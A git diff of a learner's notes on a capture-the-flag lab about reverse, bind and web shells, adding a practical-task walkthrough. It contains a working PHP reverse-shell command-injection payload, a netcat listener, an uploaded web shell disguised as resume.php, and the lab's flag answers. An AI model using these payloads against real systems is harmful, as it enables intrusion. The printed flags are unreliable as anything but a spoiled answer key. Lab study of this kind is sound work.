@@ -8,6 +8,7 @@
 - [Shell Listeners](#shell-listeners)
 - [Shell Payloads](#shell-payloads)
 - [Web Shell](#web-shell)
+- [Practical Task](#practical-task)
 
 
 ## Room Introduction
@@ -282,7 +283,7 @@ A shell payload could be a command or script that opens the shell to inbound con
 	- Uses `system`
 
 **PHP Reverse Shell Using the passthru Function**
-- PHP: `php -r '$sock=fsockopen("1.2.3.4",443);popen("sh <&3 >&3 2>&3", "r");'`
+- PHP: ``
 	- Uses `popen` as file pointer
 ### Python
 **Python Reverse Shell by Exporting Environment Variables**
@@ -393,4 +394,89 @@ Trying this as the answer
 - `web shell` ✅
 
 
+## Practical Task
 
+In this practical task we are looking for the flags. See the questions below
+
+Pre-work,
+
+Navigate to http://10.10.180.125:8080 to see what is there:
+![](Images/Pasted%20image%2020250622150311.png)
+
+There are two links, a _Reverse/Bind Shell Task_ and a _Web Shell Task_
+
+Clicking on the _Reverse/Bind Shell Task_ takes you to http://10.10.180.125:8081/
+![](Images/Pasted%20image%2020250622150434.png)
+
+If we go back and navigate to _Web Shell Task_ which takes us to http://10.10.180.125:8082/.
+![](Images/Pasted%20image%2020250622150805.png)
+
+
+
+### ❓ Question
+> Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the / directory?
+#### 🧪 Process
+Navigated to http://10.10.180.125:8081/
+
+Presented with 
+![](Images/Pasted%20image%2020250622150434.png)
+
+Created listener using `nc -lvnp 8080`
+![](Images/Pasted%20image%2020250622152340.png)
+
+Returned to web page and pasted in `;php -r '$sock=fsockopen("10.10.229.87",8080);shell_exec("sh <&3 >&3 2>&3");';` and hit return
+
+Ordinarily the page would return a hash back fairly quickly, however this time, it looks as though nothing is happening. 
+![](Images/Pasted%20image%2020250622152603.png)
+
+Let's return back to the listener and see if we have anything...
+
+We how have a connection received notice
+
+Let's run a command (`ls`) to see if it is working
+![](Images/Pasted%20image%2020250622152736.png)
+
+Result, now the question asks about flag saved in `/`. We can navigate to that and perform another `ls`.
+![](Images/Pasted%20image%2020250622152824.png)
+
+Okay, and there it is, `flag.txt` we can use `cat` to show the content and hopefully that will give us our flag.
+![](Images/Pasted%20image%2020250622152921.png)
+
+Boom! There it is `THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}`.
+
+Trying this as the answer
+#### ✅ Answer
+- `THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}` ✅
+
+### ❓ Question
+> Using a web shell, exploit the unrestricted file upload vulnerability and get a shell. What is the content of the flag saved in the / directory?
+#### 🧪 Process
+Navigate to _Web Shell Task_.
+![](Images/Pasted%20image%2020250622150805.png)
+As the room suggests, there is not likely to be any file validation on the upload. So we can grab a pre-made shell.
+
+I choose to use the _p0wny-shell_.
+
+Navigated to the github repository (https://github.com/flozz/p0wny-shell) and clicked `shell.php
+![](Images/Pasted%20image%2020250622154817.png)
+
+Clicked Raw to make it easier to copy paste
+![](Images/Pasted%20image%2020250622155018.png)
+
+Paste into _sublime-text_ and saved it as ~/Downloads/resume.php. You know, just to keep the theme.
+![](Images/Pasted%20image%2020250622155120.png)
+
+Navigate back to the page, click **Browse**, navigate to _~/Downloads_ and double click **resume.php**, then click **Upload Your CV**. Once uploaded you will see a confirmation
+![](Images/Pasted%20image%2020250622155323.png)
+
+Let's go find the file, we can assume `uploads` so replace `index.php` with `/uploads/resume.php`
+![](Images/Pasted%20image%2020250622155430.png)
+
+In, Like, Flynn.
+
+Let's `cat` the flag.
+![](Images/Pasted%20image%2020250622155509.png)
+
+Trying this as the answer
+#### ✅ Answer
+- `THM{202bb14ed12120b31300cfbbbdd35998786b44e5}` ✅
